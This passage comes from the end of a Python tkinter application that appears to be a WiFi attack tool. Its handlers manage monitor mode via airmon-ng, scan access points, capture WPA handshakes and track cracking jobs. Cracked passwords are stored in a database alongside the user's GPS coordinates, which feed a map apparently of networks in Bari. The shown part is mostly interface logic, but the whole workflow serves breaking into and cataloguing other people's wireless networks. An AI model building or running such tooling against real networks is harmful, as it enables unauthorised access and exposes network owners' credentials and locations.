        self.stop_crack_button.config(state=tk.NORMAL if any_cracking else tk.DISABLED)

    def trigger_map_update(self): 
        if not self.map_generation_in_progress:
            self.map_generation_in_progress = True
            self.update_status("Map: Updating...")
            log_to_gui("Map generation/update process started.") # Log generico
            threading.Thread(target=update_and_generate_map_task, daemon=True).start() # No args
        else:
            log_to_gui("Map generation already in progress.")

    def open_bari_map_file_and_regenerate(self):
        self.trigger_map_update()
        map_file_path = os.path.abspath(MAP_FILE_NAME)
        if os.path.exists(map_file_path):
            try: webbrowser.open(f"file://{map_file_path}")
            except Exception as e: messagebox.showinfo("Map Error",f"Could not open map: {e}")
        else:
             log_to_gui(f"Map file '{MAP_FILE_NAME}' not yet created. Will generate now.")
             messagebox.showinfo("Map Generating", f"Map '{MAP_FILE_NAME}' is generating. Try opening again shortly.")


    # --- Result Handlers ---
    def handle_monitor_result(self, iface_name):
        self.monitor_interface = iface_name
        self.pending_monitor_start_iface = None
        if iface_name:
            self.update_status(f"Monitor mode on: {iface_name}"); self.log_message(f"Monitor on {iface_name}.", "SUCCESS")
            self.interface_combo['values'] = [iface_name]; self.interface_combo.set(iface_name); self.interface_combo.config(state=tk.DISABLED)
            self.refresh_interfaces_button.config(state=tk.DISABLED)
            self.monitor_start_button.config(text="■ Stop Mon", command=self.stop_monitor_mode, state=tk.NORMAL)
            for btn in [self.scan_button, self.check_clients_button, self.capture_button]: btn.config(state=tk.NORMAL)
        else:
            self.update_status("Monitor mode failed."); self.log_message("Monitor mode failed.")
            self.interface_combo.config(state='readonly'); self.refresh_interfaces_button.config(state=tk.NORMAL)
            self.monitor_start_button.config(text="▶ Start Mon", command=self.start_monitor_mode, state=tk.NORMAL)
            for btn in [self.scan_button, self.check_clients_button, self.capture_button]: btn.config(state=tk.DISABLED)
            self.refresh_interfaces()

    def handle_monitor_stopped(self, result_tuple):
        success, original_iface_name = result_tuple
        pending_iface = self.pending_monitor_start_iface
        self.pending_monitor_start_iface = None

        if success:
            self.monitor_interface=None; self.update_status("Monitor mode stopped."); self.log_message(f"Monitor stopped on {original_iface_name}.","SUCCESS")
        else: self.update_status(f"Stop monitor on {original_iface_name} failed."); self.log_message(f"Stop monitor on {original_iface_name} failed.")

        self.monitor_start_button.config(text="▶ Start Mon", command=self.start_monitor_mode, state=tk.NORMAL)
        self.interface_combo.config(state='readonly'); self.refresh_interfaces_button.config(state=tk.NORMAL);
        self.refresh_interfaces()
        # --- REMOVED SAVE BUTTON from state management ---
        for btn in [self.scan_button, self.check_clients_button, self.capture_button, self.stop_scan_button, self.stop_capture_button]: btn.config(state=tk.DISABLED)

        if pending_iface and success:
            self.interface_combo.set(pending_iface)
            self.start_monitor_mode()
        elif pending_iface and not success:
             log_to_gui(f"Failed to stop previous monitor. Cannot start new on {pending_iface}.")


    def handle_scan_result(self, scanned_networks):
        self.log_message(f"Scan finished. Found {len(scanned_networks)} APs.");
        self.current_scan_results=scanned_networks
        self.network_tree.delete(*self.network_tree.get_children()); self.network_item_map.clear()
        for net in scanned_networks:
            if not net.get("bssid"): continue
            vals=(net.get("ssid","N/A"), net["bssid"], str(net.get("power","-")), str(net.get("channel","-")), net.get("encryption","Unk"), "?", "?")
            iid = self.network_tree.insert("","end",values=vals); self.network_item_map[net["bssid"]] = iid

        has_results = bool(scanned_networks)
        actions_state = tk.NORMAL if has_results and self.monitor_interface else tk.DISABLED
        if self.monitor_interface: self.scan_button.config(state=tk.NORMAL);
        self.stop_scan_button.config(state=tk.DISABLED);
        # --- REMOVED SAVE BUTTON from state management ---
        for btn in [self.check_clients_button, self.capture_button]: btn.config(state=actions_state)

    def handle_client_check_result(self, result_tuple):
        bssid, _, status_msg = result_tuple;
        iid = self.network_item_map.get(bssid);
        if iid and self.network_tree.exists(iid): self.network_tree.set(iid,"Cli",status_msg)

    def handle_capture_result(self, result_tuple):
        bssid, captured, status_msg, cap_filepath = result_tuple
        iid = self.network_item_map.get(bssid)
        if iid and self.network_tree.exists(iid): self.network_tree.set(iid,"HS",status_msg)
        self.stop_capture_button.config(state=tk.DISABLED)
        if self.monitor_interface:
            for btn in [self.capture_button, self.check_clients_button, self.scan_button]: btn.config(state=tk.NORMAL)
        if captured:
            self.log_message(f"HS capture for {bssid} success: {status_msg}.", "SUCCESS")
            net_info_to_save = next((n.copy() for n in self.current_scan_results if n.get("bssid") == bssid), None)
            if not net_info_to_save:
                ssid_tree = "UnknownSSID"
                if iid and self.network_tree.exists(iid):
                    try: ssid_tree = self.network_tree.item(iid, 'values')[0]
                    except IndexError: pass
                net_info_to_save = {"bssid": bssid, "ssid": ssid_tree}
                log_to_gui(f"Warning: Network data for {bssid} not found in scan results, using placeholder.")

            net_info_to_save["handshake_captured"] = 1
            if cap_filepath: net_info_to_save["handshake_filepath"] = os.path.abspath(cap_filepath)
            self.network_pending_db_save = net_info_to_save
            threading.Thread(target=get_location_task, daemon=True).start() # Get location before saving
            self.refresh_handshake_list() # Refresh list to show the new .cap file

    def handle_location_result(self, location_data_tuple):
        lat, lon = location_data_tuple
        self.latitude = lat; self.longitude = lon
        status_msg = f"Location: Lat={float(lat):.6f}, Lon={float(lon):.6f}" if lat and lon else "Location not acquired."
        self.update_status(status_msg); self.log_message(status_msg, "SUCCESS" if lat and lon else "WARNING")
        if self.network_pending_db_save:
            net_to_save = self.network_pending_db_save; self.network_pending_db_save = None
            # Now save the network data with the obtained location
            threading.Thread(target=save_scan_data_task, args=([net_to_save], lat, lon), daemon=True).start()

    def handle_save_result(self, result_tuple):
        success, detail = result_tuple
        msg = f"Data saved/updated: {detail}." if success else f"Save failed: {detail}."
        self.update_status(msg); self.log_message(msg, "SUCCESS" if success else "ERROR");
        # --- REMOVED SAVE BUTTON from state management ---

    def handle_handshake_files_loaded(self, hs_files_list):
        current_iids = set(self.handshake_tree.get_children())
        loaded_filepaths = set()
        new_handshake_map = {} # Rebuild map to ensure consistency

        # Add or update items in the treeview
        for hs_data in hs_files_list:
            fp = hs_data["filepath"]
            loaded_filepaths.add(fp)
            new_handshake_map[fp] = hs_data # Use filepath as key for the map
            vals = (hs_data["filename"], hs_data["ssid"], hs_data["bssid"], hs_data["status"])
            item_iid = fp # Use filepath as Treeview item ID

            if self.handshake_tree.exists(item_iid):
                current_vals = self.handshake_tree.item(item_iid, 'values')
                # Update only if values have changed to avoid unnecessary flicker
                if current_vals != vals:
                    self.handshake_tree.item(item_iid, values=vals)
            else:
                self.handshake_tree.insert("", "end", values=vals, iid=item_iid)

        # Update the internal mapping after processing all files
        self.handshake_item_map = new_handshake_map

        # Remove items from treeview that are no longer in the loaded list
        iids_to_remove = current_iids - loaded_filepaths
        if iids_to_remove:
             for iid_remove in iids_to_remove:
                if self.handshake_tree.exists(iid_remove):
                    self.handshake_tree.delete(iid_remove)

        # Update button states
        has_items = bool(self.handshake_item_map)
        self.crack_button.config(state=tk.NORMAL if has_items else tk.DISABLED)
        any_cracking = any("Cracking..." in d.get("status", "") or "Stopping..." in d.get("status", "") for d in self.handshake_item_map.values())
        self.stop_crack_button.config(state=tk.NORMAL if any_cracking else tk.DISABLED)
        self.update_status(f"HS list updated ({len(self.handshake_item_map)} files).")
        self.refresh_handshakes_button.config(state=tk.NORMAL)


    def handle_crack_result(self, crack_result_tuple):
        bssid, key, status, cap_filepath = crack_result_tuple
        iid = cap_filepath # Use filepath as the ID
        if self.handshake_tree.exists(iid):
            self.handshake_tree.set(iid,"Status",status)
            if iid in self.handshake_item_map: self.handshake_item_map[iid]["status"]=status

        if key:
            # Save successful crack result (password found)
            db_data = {"bssid": bssid, "password": key, "handshake_captured": 1, "handshake_filepath": os.path.abspath(cap_filepath)}
            # Attempt to save without location first, map will update if location already exists or is added later
            threading.Thread(target=save_scan_data_task, args=([db_data], self.latitude, self.longitude), daemon=True).start()
        elif "Not Found" in status or "Failed" in status or "Timeout" in status:
             # Ensure attempt is recorded in DB for map even on failure, IF the handshake file still exists
             if os.path.exists(cap_filepath):
                  db_data_attempt = {"bssid": bssid, "handshake_captured": 1, "handshake_filepath": os.path.abspath(cap_filepath)}
                  # Attempt to save without location first
                  threading.Thread(target=save_scan_data_task, args=([db_data_attempt], self.latitude, self.longitude), daemon=True).start()

        # Update button states
        any_cracking = any("Cracking..." in d.get("status", "") or "Stopping..." in d.get("status", "") for d in self.handshake_item_map.values())
        self.crack_button.config(state=tk.NORMAL if self.handshake_item_map else tk.DISABLED)
        self.refresh_handshakes_button.config(state=tk.NORMAL)
        self.stop_crack_button.config(state=tk.NORMAL if any_cracking else tk.DISABLED)
        if not any_cracking: self.update_status("All cracking tasks finished.")

    def open_updated_map_from_crack_tab(self):
        self.update_status("Requesting map update and opening...")
        log_to_gui("Map update requested. Will attempt to open in browser.")

        # Avvia l'aggiornamento/generazione della mappa in background
        self.trigger_map_update() # Questo è asincrono

        # Tenta di aprire la mappa. Se non esiste, l'utente verrà informato.
        # L'aggiornamento avverrà comunque in background.
        map_file_path_abs = os.path.abspath(MAP_FILE_NAME)
        if os.path.exists(map_file_path_abs):
            try:
                webbrowser.open(f"file:///{map_file_path_abs}")
                log_to_gui(f"Opened existing map: {map_file_path_abs}. Update is in progress if new data exists.")
            except Exception as e:
                log_to_gui(f"Error opening map file {map_file_path_abs}: {e}")
                messagebox.showerror("Map Error", f"Could not open map file: {e}")
        else:
            log_to_gui(f"Map file '{MAP_FILE_NAME}' not found. Generating now. Please try opening again shortly.")
            messagebox.showinfo("Map Generating",
                                f"Map file '{MAP_FILE_NAME}' is currently being generated or updated.\n"
                                "Please try clicking 'Open Updated Map' again in a moment.")

    def handle_map_update_finished(self, success_flag):
        self.map_generation_in_progress = False
        if success_flag:
            log_to_gui(f"Bari map successfully updated/generated. Path: {os.path.abspath(MAP_FILE_NAME)}")
            self.update_status(f"Map updated: {os.path.basename(MAP_FILE_NAME)}")
        else:
            log_to_gui("Bari map update/generation failed. Check logs.")
            self.update_status("Map update failed.")

    def on_closing(self):
        log_to_gui("Exiting...");
        procs_to_stop = {"Scan": scan_process_obj, "Capture": capture_process_obj}
        for bssid_proc, proc_obj_val in list(crack_processes.items()): procs_to_stop[f"Crack ({bssid_proc})"] = proc_obj_val
        for name, proc_obj in procs_to_stop.items():
            if proc_obj: terminate_process(proc_obj, name)
        crack_processes.clear()
        if self.monitor_interface:
            try: subprocess.run(["sudo","airmon-ng","stop",self.monitor_interface],check=False,timeout=10,capture_output=True)
            except: pass
        self.destroy()

# --- Main Execution ---
if __name__ == "__main__":
    # --- REMOVED ORPHAN LINE CAUSING NameError ---
    # safe_ssid = re.sub(r'[\\/*?:"<>| ]','_', ssid) if ssid and ssid!="<Hidden>" else "UnknownSSID"

    if os.geteuid() != 0:
        print("WARNING: Not running as root. Sudo is recommended for full functionality.")
    try: from PIL import Image, ImageTk
    except ImportError: print("WARNING: Pillow library not found. Logos may not display. Install with: pip install Pillow")

    app = WifiToolApp();
    app.mainloop()
